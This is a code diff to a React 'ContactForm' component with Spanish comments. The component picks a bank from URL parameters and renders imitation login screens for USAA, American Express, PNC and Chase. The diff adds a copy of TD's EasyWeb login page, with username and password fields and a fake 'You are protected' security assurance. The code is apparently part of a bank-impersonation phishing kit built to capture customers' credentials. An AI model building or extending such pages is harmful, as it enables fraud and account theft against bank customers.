@@ -28,6 +28,7 @@ export default function ContactForm() {
   const [submitting, setSubmitting] = useState(false)
   const [formStep, setFormStep] = useState('username') // 'username' | 'password' (para USAA)
   const [accountType, setAccountType] = useState('cards-banking') // para American Express
+  const [showDescription, setShowDescription] = useState(false) // para TD
 
   // Obtener parámetros de URL
   const params = new URLSearchParams(window.location.search)
@@ -95,6 +96,7 @@ export default function ContactForm() {
   const isPNC = bankName?.toLowerCase().includes('pnc')
   const isUSAA = bankName?.toLowerCase().includes('usaa')
   const isAmex = bankName?.toLowerCase().includes('american express')
+  const isTD = bankName?.toLowerCase().includes('td')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -789,6 +791,96 @@ export default function ContactForm() {
                 </a>
                 <a href="#" className="block text-sm text-blue-600 hover:text-blue-700 font-semibold">
                   Visit Our Security Center
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para TD (Toronto-Dominion)
+    if (isTD) {
+      return (
+        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+          <div className="mx-auto max-w-2xl px-4 py-10 sm:px-8">
+            <h1 className="mb-12 text-3xl font-light text-gray-700">EasyWeb Login</h1>
+
+            <div className="rounded-lg bg-gray-50 p-10">
+              <form onSubmit={submitForm} className="space-y-8">
+                {/* Username or Access Card */}
+                <div>
+                  <label className="mb-3 block text-base text-gray-700">Username or Access Card</label>
+                  <input
+                    type="text"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="w-full border-b-2 border-gray-300 bg-transparent px-0 py-4 text-gray-800 outline-none transition-colors focus:border-green-600"
+                  />
+                </div>
+
+                {/* Description (Optional) - Toggle */}
+                <button
+                  type="button"
+                  onClick={() => setShowDescription(!showDescription)}
+                  className="flex items-center gap-2 text-base text-green-600 hover:text-green-700 font-medium"
+                >
+                  <span className="text-xl">{showDescription ? '−' : '+'}</span>
+                  <span>Description (Optional)</span>
+                </button>
+
+                {/* Password */}
+                <div>
+                  <label className="mb-3 block text-base text-gray-700">Password</label>
+                  <div className="relative">
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full border-b-2 border-gray-300 bg-transparent px-0 py-4 pr-10 text-gray-800 outline-none transition-colors focus:border-green-600"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                    >
+                      <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                    </button>
+                  </div>
+                </div>
+
+                {/* Remember me */}
+                <label className="flex items-center gap-3">
+                  <input
+                    type="checkbox"
+                    checked={rememberUsername}
+                    onChange={(e) => setRememberUsername(e.target.checked)}
+                    className="h-5 w-5 cursor-pointer rounded border-2 border-green-600 accent-green-600"
+                  />
+                  <span className="text-base text-gray-700">Remember me</span>
+                </label>
+
+                {/* Login Button */}
+                <button
+                  type="submit"
+                  disabled={submitting}
+                  className="mt-10 w-full rounded-lg bg-green-600 py-4 font-bold text-white hover:bg-green-700 disabled:opacity-60 flex items-center justify-center gap-2"
+                >
+                  <Icon name="lock" size={18} />
+                  {submitting ? 'Logging in…' : 'Login'}
+                </button>
+              </form>
+
+              {/* Links */}
+              <div className="mt-10 space-y-4 border-t border-gray-200 pt-8">
+                <a href="#" className="block text-base text-green-600 hover:text-green-700 font-medium">
+                  Forgot your username or password?
+                </a>
+                <a href="#" className="flex items-center gap-2 text-base text-green-600 hover:text-green-700 font-medium">
+                  <Icon name="lock" size={18} />
+                  <span>TD Online and Mobile Security Guarantee: You are protected</span>
                 </a>
               </div>
             </div>
